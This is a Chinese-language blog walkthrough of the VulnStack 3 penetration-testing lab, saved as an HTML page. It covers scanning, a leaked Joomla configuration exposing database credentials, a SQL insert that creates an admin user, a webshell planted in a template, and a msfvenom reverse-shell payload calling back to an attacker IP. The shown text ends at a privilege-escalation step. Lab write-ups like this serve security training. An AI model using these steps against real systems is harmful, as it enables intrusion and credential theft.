@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>VulnStack Pass-3 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境搭建本次靶场是红日3靶场，拓扑图如下，边界主机的ip和图上不一致。 涉及知识点：joomla、nginx反向代理、内网代理、psexec横向、ipc配合sc上线域控等 目标：拿下域控 192.168.93.10  信息搜集这里连的寝室wifi，设备有点多，就不扫c段了，直接手动确定web机器ip为192.168.3.64 nmap扫描12nmap --min-rate 10000 -p- 19">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnStack Pass-3">
+<meta property="og:url" content="https://drblack.top/2023/11/12/Vuln-stack%203/index.html">
+<meta property="og:site_name" content="Drblack&#39;Blog">
+<meta property="og:description" content="环境搭建本次靶场是红日3靶场，拓扑图如下，边界主机的ip和图上不一致。 涉及知识点：joomla、nginx反向代理、内网代理、psexec横向、ipc配合sc上线域控等 目标：拿下域控 192.168.93.10  信息搜集这里连的寝室wifi，设备有点多，就不扫c段了，直接手动确定web机器ip为192.168.3.64 nmap扫描12nmap --min-rate 10000 -p- 19">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://drblack.top/img/1000.webp">
+<meta property="article:published_time" content="2023-11-12T07:02:41.000Z">
+<meta property="article:modified_time" content="2023-11-12T07:20:41.342Z">
+<meta property="article:author" content="Drblack">
+<meta property="article:tag" content="vulnstack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://drblack.top/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack.top/2023/11/12/Vuln-stack%203/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'VulnStack Pass-3',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-12 15:20:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">VulnStack Pass-3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-12T07:02:41.000Z" title="发表于 2023-11-12 15:02:41">2023-11-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-12T07:20:41.342Z" title="更新于 2023-11-12 15:20:41">2023-11-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="VulnStack Pass-3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>本次靶场是红日3靶场，拓扑图如下，边界主机的ip和图上不一致。</p>
+<p><strong>涉及知识点</strong>：joomla、nginx反向代理、内网代理、psexec横向、ipc配合sc上线域控等</p>
+<p><strong>目标：</strong>拿下域控 192.168.93.10</p>
+<p><img src="/images/image-20231112125559564.png" alt="image-20231112125559564"></p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>这里连的寝室wifi，设备有点多，就不扫c段了，直接手动确定web机器ip为192.168.3.64</p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -p- 192.168.3.64 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描端口开放情况</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231109205132509.png" alt="image-20231109205132509"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p22,80,3306 192.168.3.64</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 20:52 CST</span><br><span class="line">Nmap scan report for 192.168.3.64</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)</span><br><span class="line">|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)</span><br><span class="line">| http-robots.txt: 15 disallowed entries</span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/</span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/</span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">|_http-title: Home</span><br><span class="line">3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.7.27-0ubuntu0.16.04.1</span><br><span class="line">|   Thread ID: 14</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, InteractiveClient, Support41Auth, DontAllowDatabaseTableColumn, ODBCClient, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, LongCol</span><br><span class="line">SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt:</span><br><span class="line">|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)</span><br><span class="line">80/tcp   open  http    nginx 1.9.4</span><br><span class="line">|_http-server-header: nginx/1.9.4</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-robots.txt: 15 disallowed entries</span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/</span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/</span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">|_http-title: Home</span><br><span class="line">3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.7.27-0ubuntu0.16.04.1</span><br><span class="line">|   Thread ID: 14</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, InteractiveClient, Support41Auth, DontAllowDatabaseTableColumn, ODBCClient, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, LongColumnFlag, LongPassword, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt:</span><br><span class="line">| 6ety+:C-</span><br><span class="line">| QP9\x0F\x1C%\x1C\x15\x01G</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">MAC Address: B2:FD:FB:6E:83:20 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X|3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 2.6.32 - 3.10</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds</span><br></pre></td></tr></table></figure>
+
+<p>从上我们获得的信息是</p>
+<p>22端口 OpenSSH 5.3 (protocol 2.0)，考虑可以后续ssh爆破</p>
+<p>80端口是joomble框架搭建的，存在一个robots.txt文件，里面泄漏了一下路径，但是是不可访问的</p>
+<p>3306端口mysql是5.7.27，该端口开放后续如果有密码可以考虑数据库远程登录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,80,3306 192.168.3.64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231109210752413.png" alt="image-20231109210752413"></p>
+<p>从nmap自带插件扫描中可以得到信息：<strong>joomla版本是3.9.12</strong>，和一些存在的简单目录</p>
+<p>知道了版本信息，看看有没有对应的漏洞</p>
+<p><img src="/images/image-20231112134424367.png" alt="image-20231112134424367"></p>
+<p>这里基本上都试了，都无法利用。。。</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>目录信息比较少，尝试用gobuster扫一下目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.64:80 -w  /Users/drblack/dict/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现结果显示有些问题，设置一下过滤404和502响应码的结果</p>
+<p><img src="/images/image-20231109211529648.png" alt="image-20231109211529648"></p>
+<p><img src="/images/image-20231109213252474.png" alt="image-20231109213252474"></p>
+<p>东西还是有点少，没有可利用的信息，再重新指定一下扫描的文件后缀<code>txt,zip,php</code>	，有一些收获</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.3.64:80 -w /Users/drblack/dict/directory-list-2.3-medium.txt -x txt,zip,php -b 502,404</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231109213707553.png" alt="image-20231109213707553"></p>
+<p>再使用dirsearch扫描，综合一下结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -x 502,404 -u http://192.168.3.64/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231109214315017.png" alt="image-20231109214315017"></p>
+<p>发现1.php，是phpinfo界面里面有xff头的信息</p>
+<p><img src="/images/image-20231109214641465.png" alt="image-20231109214641465"></p>
+<p>configuration.php~这里能访问，数据库信息泄漏. 账户：testuser密码：cvcvgjASD!@ （这里可以将改密码放入字典中，后续如果爆破可能会用到）</p>
+<p><img src="/images/image-20231109224042933.png" alt="image-20231109224042933"></p>
+<h2 id="后台GETSHELL"><a href="#后台GETSHELL" class="headerlink" title="后台GETSHELL"></a>后台GETSHELL</h2><p>远程连接数据库</p>
+<p><img src="/images/image-20231110201340322.png" alt="image-20231110201340322"></p>
+<p>这里可以考虑多种思路。一种是后台添加管理员账户密码进网站后台再找漏洞点getshell，一种是尝试直接getshell。</p>
+<p>先考虑直接getshell，但是需要root用户才能有权限去写入文件.</p>
+<p><img src="/images/image-20231112133624155.png" alt="image-20231112133624155"></p>
+<p>那么就看看能不能从数据库内容入手，查找数据表，看看有没有账户密码</p>
+<p><img src="/images/image-20231110201419499.png" alt="image-20231110201419499"></p>
+<p>am2zu_users数据表中存在admin账户password但是加密了</p>
+<p><img src="/images/image-20231110201600355.png" alt="image-20231110201600355"></p>
+<p>这里我有几个思路，1. 密码爆破 2.新建用户 3. 通过mysql数据库getshell</p>
+<ol>
+<li><p>用户密码爆破</p>
+<p>靶场类机器密码一般不会是爆破出来的（后面就打脸了），这个可以后面再尝试。</p>
+</li>
+<li><p>新建管理员用户</p>
+</li>
+</ol>
+<p>这里有一种错误做法，在下面直接手动新建用户，这样的password是不符合的，他要经过一个解密过程，结果和password不同</p>
+<p><img src="/images/image-20231110202201540.png" alt="image-20231110202201540"></p>
+<p><img src="/images/image-20231110205035747.png" alt="image-20231110205035747"></p>
+<p>这里我手动插入一直不成功，找到了官网忘记密码的操作方法</p>
+<p><img src="/images/image-20231110205522773.png" alt="image-20231110205522773">试试用命令插入看看哪里有问题呢</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `umnbt_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;Administrator2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());</span><br></pre></td></tr></table></figure>
+
+<p>name这里，应该是Administrator，之前写的Super User，超级管理员只能一个！</p>
+<p><img src="/images/image-20231110205211788.png" alt="image-20231110205211788"></p>
+<p>插入group表，有一个是我之前手动添加的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `umnbt_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">&#x27;8&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231110205425841.png" alt="image-20231110205425841"></p>
+<p>添加后，发现还是登录不进去。。。</p>
+<p>卡了一会，发现是<strong>表没找对!</strong></p>
+<p><img src="/images/image-20231110210811709.png" alt="image-20231110210811709"></p>
+<p>重新输入语句插入，修改一下对应表名称就行了，经过测试，这里把administrator账户密码直接修改了也可以登录</p>
+<p><img src="/images/image-20231110210933113.png" alt="image-20231110210933113"></p>
+<p>进入后台之后，可以看看有没有后台getshell的文章</p>
+<p><img src="/images/image-20231110212046129.png" alt="image-20231110212046129"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">官网下载joomla中文包com_zmaxappstore.zip，解压修改install.xml 添加&lt;filename&gt;&gt;test.php&lt;/filename&gt; 将test.php放到admin文件夹内，重新打包zip，后台操作Extensions–&gt; install–&gt;upload package file</span><br><span class="line"></span><br><span class="line">shell_url:/administrator/components/&#123;zip包名&#125;/da.php</span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">后台操作 Global Configuration- -&gt;media–&gt;Legal Extensions (File Types)添加php后缀，媒体上传即可</span><br><span class="line"></span><br><span class="line">第三种</span><br><span class="line">后台操作 Extensions–&gt;Templates–&gt;Templates–&gt;xxx Details and Files修改error.php文件 添加shell代码，save保存，</span><br><span class="line"></span><br><span class="line">shell_url:/administrator/templates/xxx/error.php</span><br></pre></td></tr></table></figure>
+
+<p>提到了上面三种方法，我们试试第三种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extensions–&gt;Templates–&gt;Templates–&gt;Beez3 Details and Files</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231110212301449.png" alt="image-20231110212301449"></p>
+<p>写入shell，尝试连接</p>
+<p><img src="/images/image-20231110214008498.png" alt="image-20231110214008498"></p>
+<p>这里路径应该是<code>http://192.168.3.64/templates/Beez3/error.php</code>，和文章说的有一点区别</p>
+<p><img src="/images/image-20231110213822463.png" alt="image-20231110213822463"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当我们想通过蚁剑执行一些命令的时候，发现返回ret&#x3D;127，说明有<code>disable_functions</code>的限制</p>
+<p><img src="/images/image-20231110214357361.png" alt="image-20231110214357361"></p>
+<p>通过查看网站的1.php可以知道，从<code>disable_functions</code>中可以看见禁用的函数</p>
+<p><img src="/images/image-20231110214314411.png" alt="image-20231110214314411"></p>
+<p>使用蚁剑bypass插件进行绕过。</p>
+<p><img src="/images/image-20231110215534834.png" alt="image-20231110215534834"></p>
+<p>制作msf的木马准备上线msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.61 LPORT=4444 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231110221206505.png" alt="image-20231110221206505"></p>
+<p>上传后记得给执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>一直上线不了，感觉不对劲</p>
+<p><img src="/images/image-20231110223616249.png" alt="image-20231110223616249"></p>
+<p><img src="/images/image-20231110223628700.png" alt="image-20231110223628700"></p>
+<p>看看ip，和预料的完全不一样，麻了</p>
+<p><img src="/images/image-20231110223657992.png" alt="image-20231110223657992"></p>
+<p>这里这种情况没遇到过，看了网上师傅们的wp才知道，这里一个内网机器，然后用了代理将外网那台机器流量</p>
+<p>转到这台机器上了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nestat -anplt # -p 显示正在使用Socket的程序识别码和程序名称。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231110230052821.png" alt="image-20231110230052821"></p>
+<p>可以看见连接的是<code>192.168.93.100</code></p>
+<p>那下面我们需要找如何去到web机器上的方法，毕竟目前不能直接通信。找找txt文件有没有一些提示？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;*.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231110230945923.png" alt="image-20231110230945923"></p>
+<p>路径越短鱼越大，打开test.txt，发现一个账户密码信息</p>
+<p><img src="/images/image-20231110231224225.png" alt="image-20231110231224225"></p>
+<p>用这个账户密码尝试ssh登录web端的机器。 wwwuser_123Aqx</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh wwwuser@192.168.3.64</span><br></pre></td></tr></table></figure>
+
+<p>直接连接会出现一个报错，因为openssh觉得ssh-rsa加密方式不安全, 直接从8.8开始默认不允许这种密钥用于登陆了。添加下面的参数临时使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa wwwuser@192.168.3.64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20231111110225737.png" alt="image-20231111110225737"></p>
+<p>登录成功，<code>ifconfig</code>确定了是我们想要控制的web机器</p>
+<p><img src="/images/image-20231111110510648.png" alt="image-20231111110510648"></p>
+<p>用finalshell连方便传文件，</p>
+<p><img src="/images/image-20231111113018483.png" alt="image-20231111113018483"></p>
+<p>成功上线到msf</p>
+<p><img src="/images/image-20231111113724181.png" alt="image-20231111113724181"></p>
+<p>机器为linux 版本为centos 2.6.32存在脏牛提权漏洞，</p>
+<p><img src="/images/image-20231111120136793.png" alt="image-20231111120136793"></p>
